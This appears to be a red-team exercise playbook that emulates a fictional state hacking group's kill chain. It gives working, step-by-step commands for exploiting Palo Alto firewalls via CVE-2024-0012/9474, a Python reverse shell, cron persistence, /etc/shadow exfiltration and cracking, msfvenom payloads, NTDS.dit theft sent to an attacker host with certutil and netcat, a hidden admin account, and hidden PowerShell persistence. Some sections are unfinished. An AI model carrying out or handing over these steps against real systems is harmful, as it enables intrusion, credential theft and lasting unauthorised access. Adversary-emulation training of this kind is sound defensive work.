# Introduction

Background: Sassy Panda is an Eastonian government affiliated cyber group falling under the Eastonian Cyber Agency (ECA) and comprised of Easton’s most sophisticated capabilities and equipment. Sassy Panda typically focuses on espionage and information gathering and has targeted critical infrastructure in the U.S. including the New England region. Having been active for over 15 years in the computer network exploitation game, the group has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands-on-keyboard activities, and stolen credentials.

TTPS:

Enterprise:

Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure: Server, Compromise Infrastructure: Botnet, Credentials from Password Stores, Data from Local System, Data Staged, Local Data Staging, Encrypted Channel: Symmetric Cryptography, Exploit Public-Facing Application, Indicator Removal: File Deletion, Indicator Removal: Clear Network Connection History and Configurations, Lateral Tool Transfer, Log Enumeration, Masquerading: Match Legitimate Name or Location, Masquerading: Masquerade File Type, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, OS Credential Dumping: NTDS, Permission Groups Discovery: Local Groups, Permission Groups Discovery: Domain Groups, Process Discovery, Proxy, Internal Proxy, Query Registry, Remote System Discovery, Server Software Component: Web Shell, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Valid Accounts: Domain Accounts, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation

## Attack Flow

**SUBJECT TO CHANGE**

- `terran` -> `Djibouti` -> `Palo Alto Firewall` -> `router` -> `Windows DC` -> `OT`
- `orange-firewall(1.33.170.38)` -> `router` ->   `orange-dc(172.20.2.6)` -> `orange-ics(172.20.6.200)`

Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
Exploit Used: `PoC.py`
CVE: `CVE-2024-0012` and `CVE-2024-9474`

## *REQUIREMENTS*: [ClickPaste](https://github.com/Collective-Software/ClickPaste)

- download from source file
- to copy and paste information simpler to from your HOST to the VM

## Reminders

- ALWAYS click on the terminal you want to work on

## Phase 0: Initial Setup for Kill Chain

### SSH Proxy Chain

#### Terran (104.55.222.X)

```bash
ssh -N -R 5555:localhost:22 -L 4444:<DJIBOUTI_BOX>:22 -D 1080 kali@<DJIBOUTI_BOX>
```

#### Djibouti (102.214.90.X)

```bash
ssh -p 5555 localhost   # connect back to Terran
```

#### Terran (104.55.222.X)

```bash
ssh -p 4444 localhost   # tunnel to Djibouti
```

### Exploit Setup

0. WORK ON A NEW BOX, NO TERMINALS OPEN
1. Create a new folder on your `attack box`
   - This will stage all of the required files and scripts.
2. Open a text editor (nano) on the attack machine. `sudo nano PoC.py`
3. Copy PoC.py from your host and paste into VM into the text editor
   - best case of doing this is utilizing `ClickPaste`
4. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
5. `chmod +x PoC.py`

### Persistence Script Setup

1. Perform the following command: `nano pan_os_comm.py`
2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.

#### (ATTACKER MACHINE)

```bash
nc -lvnp 63842
```

```python
#!/usr/bin/env python3

import socket
import subprocess
import os
import pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.100.169", 63842))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")

```

3. Once created, run the following command: `chmod +x pan_os_comm.py`

### Create your netcat

### *Host Your Tools Folder On A Web Server*

1. In the folder where you have created your tools, start a web server to host the necessary files for the exploit
   Run the below command to start the web server:

```bash
python3 -m http.server 80
```

### *Update Your `rockyou.txt` Wordlist For Later Password Cracking*

Through OSINT and recon, we have located a list of compromised passwords from users within this company. Lets update our rockyou.txt password list to perform offline cracking hashes.

1. Locate your `rockyou.txt` file and open using sudo.
2. Once open, append the below to list of passwords to the to the list.

```bash
sudo nano /usr/share/wordlists/rockyou.txt
```

- `(copy and paste the below list)`
- `Ctrl+O`
- `ctrl+X`

#### PASSWORD LIST

```text
Summer2025
JohnDoe123
Password123!
Football@2023
C0ffeeMorn1ng
Ilov3mydog!
ChocolateCake1
BlueSky_2024
P@ssword2024!
Tiger@12345
!LoveCoding4U
Il0vePizza!
$uperman2024
!QAZ@WSX1qaz2wsx
aIpE9Y+7j#5X
tQc5FwHc@B6r
c+K$u#9j5$nB
Y@9K@2Q5@B$H
q2M@xAx+K+r#
c@5U8j+f2R3P
S$tL9W#Pg6rA
w#I9X9mT4#yS
x$JyP9+t2J9#
cA+I+g@6$p$6
P9@X+Wb@N@pG
n8$Qq#JrD8f2
p3Hu8#8W5X@t
z+b#P@4$PrH9
a$Mg5a8z@iW9
p#y#KpJ9B9Jo
fQ7P4tT+yI$V
S#qTcI#i+Z2B
PPa2x7@w9V5L
UXo9VfGk4sH$
KJ+t+d7W+oX4
AS+x8c$4f$H9
f4i#4x9W4M@5
R6F+j8I7+5S8
UVw4eKz$q2p@
j+9@e@sX4@iJ
B7s8tEoB+zG6
w#u+C#m5N$f7
V9$H6X$8r6m8
TVi$Ev#s$8$M
s#4x+F#I#3#3
w+N#C+W2iW#F
s@Da2+9@y8H2
nI6@x6@Da6$6
c@6E@n6Ze3kD
YM5F6Rs#2$Xq
s4A$e4#2n8P9
z6Y$N3H6r+e2
c$J5z3B9BuN$
BF#cG$4m+Qd2
D6a@b7#5K8W+
F+c2qJ@2hKa$
E@2$c8S4Wn+4
K8tG+9b+B6#6
fT7a4#UsT@yZ
y+9w+s@Q7f6a
t$tBb3aF+Br2
Z+9sV5B$q8+K
t+C+Q+wJ#P2g
ZY@j$F9+Ju7b
G8yR2Df+K6e8
oH@R5#Y8t$c@
cC2x@X#a4+7e
MQ#J6N5WiR6B
qT6#iRn+mN2T
v2C8$2cN+Ry$
h9n#N3h5W+3g
D+U8@5d2t2i#
P@G$5i+o+dEf
K3G4vBt+k$x@
Q$3m5$B3A9Ia
S2G#3@i9+2Vq
aW7$4G+SwB@8
A#s+s4U+iV6h
HB3#6yZj3#H$
e#o9#c$M9H3@
w$3h7J+5$3R5
E@m5Q9o3f6f@
Z#2+3Q#tKi5A
F4T8E7PhJmE#
U7#2#U9K2x+3
q#Qd2qX#7#2#
w4G#cI+D+7yY
QHw$Bd8Cu3A9
Z@4d#Fk+9a+9
D3v5Mj4@U$t@
T+M+2A3D+c#W
M5+rKu#3@p4s
FDrSt$u8+u@R
d+L5C$iPo@H#
yVj4T4+Se6Y+
M8@D#D$4#m2G
rB9X7K+3uN@M
Z3F$c8b9Sp#3
mL@n2a3D@pP4
V$7+9YiU+7Q$
CXa9D+r9#U3+
f7+4A@G@6i@H
X2qY$6@Cv9w2
KG+Vs7e5$dF4

```

- Now that you are fully set up, move to Phase 1.

## Phase 1: Initial Access via Palo Alto Exploit

### Section 1. Setting Up Listeners

1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
2. In one of the terminal panes, set up your initial lsitener using Netcat to catch the callback shell from the exploit. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
   - `nc -lnv 7837`
3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm.py* script that was created earlier.
4. Run the following command to start the second listener:
   - `nc -lnv 63842`

### Section 2. Execute the PoC Script

1. In one of the empty terminal panes, execute the PoC.py script to trigger the exploit:

```bash
python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>
```

3. Watch the initial listener pane to ensure it catches the callback from the exploit.
   If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:

![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)

   If you do not see the following, its time to troubleshoot.

4. To receive a more usable shell tty, use the following command:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Troubleshooting steps:

   1. Use the correct IP addresses and ports in your listeners and exploit arguments
   2. Ensure there is routing to the Palo Management Interface.
   3. Ensure you copied your exploit script over correctly
   4. Find a Sassy Panda SME and pray they have the answers :-)

## Phase 2: Palo Persistence

- `Ctrl-Z` OR `Ctrl-C` **WILL KILL YOUR SHELL**
- Palo Alto Shell has limited functionality
- **Tab autocompletion and the up/down arrow keys won’t work**
- The first priority is to establish persistence using a cron job and the pan_os_comm.py script you created earlier.

1. Start by running some basic enumeration commands to get a sense of your current environment on the machine.

   - (response should be "root")

```bash
whoami
id
bash 
pwd
cd ~
ls
```

2. Next, import the `pan_os_comm.py` script from your attack machine, where it is being hosted via the web server.
   `wget -O /usr/local/bin/pan_os_comm.py http://<IP_of_your_attack_box>:<port>/pan_os_comm.py`

3. To ensure that the file has been successfully downloaded and is executable, run:

```bash
ls -l /usr/local/bin | grep pan_os
```

4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:

```bash
(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm.py >/dev/null 2>&1") | crontab -
```

NOTE- This will add a cron job that runs every minute, calling your pan_os_comm.py script and sending a beacon to your second listener.

6. To check that your cron job has been successfully added, run the following:
   `crontab -l`
NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.

## Phase 3: Enumeration and Exfil

Now that we have a way to return to the system, let’s gather critical files containing sensitive data, which can be exfiltrated and reviewed offline for password cracking.

1. We’ll start by viewing some important files and saving them to a new document for exfiltration:

`UTILIZING THE CALL BACK BEACON- NOT THE EXPLOIT SHELL`

```bash
cd ~
cat /etc/passwd > users.txt
cat /etc/shadow >> users.txt  # Notice the '>>', it appends the content of /etc/shadow
cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file
```

NOTE: The `>>` operator ensures that the contents of `/etc/shadow` and `/etc/hosts` are appended to `users.txt`. **If you use** `>`, **the file will be overwritten.**

2. Next, use `SCP` to securely copy the `users.txt` file to your attack machine:

   - On your Kali machine, run the command `systemctl status ssh`.
   - If disabled and inactive, run the following two commands:

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

To confirm the service has started, run
`systemctl status ssh`

```bash
echo '' > /root/.ssh/known_hosts
```

```bash
scp users.txt kali@<your_ip_address>:.
```

type `y`

NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and this will drop in your kali home.

4. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:

```bash
cd ~
ls | grep users.txt
```

4. Once you’ve confirmed that the file has been successfully transferred, you can exit the compromised machine. Your beacon terminal should still be active, allowing you to regain access at any time.
   `exit`

## Phase 4: Privilege Escalation

In this section, we will leverage the exfiltrated users.txt file that was pulled from the Palo Alto system. We will perform offline password cracking to gain legitimate credentials for the device.

1. First, verify that you’re in the correct directory where users.txt is located. You can search for the file and navigate to it with the following commands: `find / -name "users.txt"`
   Once you have found the file, change to the directory where it's located (unless you are already there): `cd /path/to/directory/with/users.txt`
2. Once you are in the correct directory, run the following command to create a new file containing only the valid SHA-256 hashes and usernames from the users.txt file:

```bash
grep -E '^\S+:\$5\$' users.txt > valid_hashes.txt
```

   This command filters the content of users.txt and extracts the lines that start with valid SHA-256 hashes ($5$), saving them to a new file called valid_hashes.txt.
5. Now that you have the valid hashes in valid_hashes.txt, you can begin cracking the passwords offline using Hashcat. Run the following command to start the cracking process with the rockyou.txt wordlist:

```bash
hashcat -m 7400 -a 0 valid_hashes.txt /usr/share/wordlists/rockyou.txt
```

This will use Hashcat to attempt cracking the passwords. The -m 7400 option specifies the SHA-256 crypt format, and the -a 0 option sets the attack mode to dictionary-based.
   -While Hashcat is running, you can check the status of the cracking process by using the following command: `hashcat --status`

6. Once Hashcat has completed the cracking process, you can view the cracked passwords by running:

```bash
hashcat --show valid_hashes.txt
```

7.Once the hashes are cracked run a cat on the valid_hashes.txt file to see who the passwords belong to: `cat valid_hashes.txt`

8. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@1.33.170.38
```

- When prompted, enter the cracked password. If successful, you should be logged into the Palo Alto device.

![image](https://github.com/user-attachments/assets/66e07739-2790-485b-9154-57c3ca5a34c8)

## Phase 5: Internal Reconnaissance & Enumeration

In this section, we’ll perform network discovery using native PAN-OS commands directly from the compromised Palo Alto device. We’ll focus on gathering network information, such as interfaces, routing tables, and active sessions.

Additionally, we copy all outputs from coommands into a text document on our local machine for later review.

1. Get Network Interfaces and copy them into a text file on your host machine:

```bash
show interface all
```

2. View routing table and copy into same created text file:

```bash
show routing route
```

3. Check arp table:

```bash
show arp all
```

#### Look for management configs or logs

```bash
cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
```

Copy the output and paste into a text editor on your kali and save the file.

#### Attempt to pivot through firewall if routing/NAT is enabled

- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal
network.

## Phase 6: Target Discovery Inside Orange Space

### Metasploit

```
msfconsole -q
```

#### initialize the metasploit shell

```
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST eth0
options
```

#### Execute metasploit shell in the background

```bash
run -j
```

```bash
chmod +x mspayload.elf
./mspayload.elf
```

# router add the router section here

Assuming pivot success to internal hosts:

#### Scan internal subnets for DC or LDAP

```bash
nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
```

- Look for the Domain Controller (likely in orange-servers or orange-users).

## Phase 7: Credential Access (via LDAP, SAM/NTDS)

- Once a DC is identified (e.g., 172.20.2.X), you can:
  - `88`, `389`
- Enumerate via LDAP (LOLBAS):

```bash
ldapsearch -x -h 172.20.2.X -b "dc=orange,dc=local"
```

If admin rights are obtained, dump credentials:

1. Use secretsdump from Impacket

```bash
impacket-secretsdump 'orange.local/adminuser:password@172.20.2.X'
```

2. If on host with NTDS.dit access:
Copy ntds.dit and SYSTEM hive for offline cracking

```bash
copy C:\Windows\NTDS\ntds.dit D:\stolen\
reg save hklm\system D:\stolen\system.hiv
```

Transfer those over SMB/certutil:

```bash
certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
nc.exe <attacker_ip> 4444 < ntds.dit
nc.exe <attacker_ip> 4445 < system.hiv
```

Then parse locally:

```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```

## Phase 8: Lateral Movement and Persistence

Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:

Make the Payload file for The Palo:
On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called pan_sec_pol.

``` bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > pan_sec_pol
```

Next, make the payload file for the vyatta routers:
In the same directory on your Attack box, run the following command. The payload will be saved to a file called netflow.vyatta

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
```

Use Admin Shares:

```bash
wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
psexec.py orange.local/adminuser@172.20.0.X
```

### Create a hidden user (LOLBAS)

```bash
net user stealthyUser P@ssw0rd! /add
net localgroup administrators stealthyUser /add
```

### Persist via Scheduled Task or Service

```bash
schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
```

Or use registry run keys:

```bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t 

REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
```

## Phase 9: OT Network Target Prep (Later Stage)
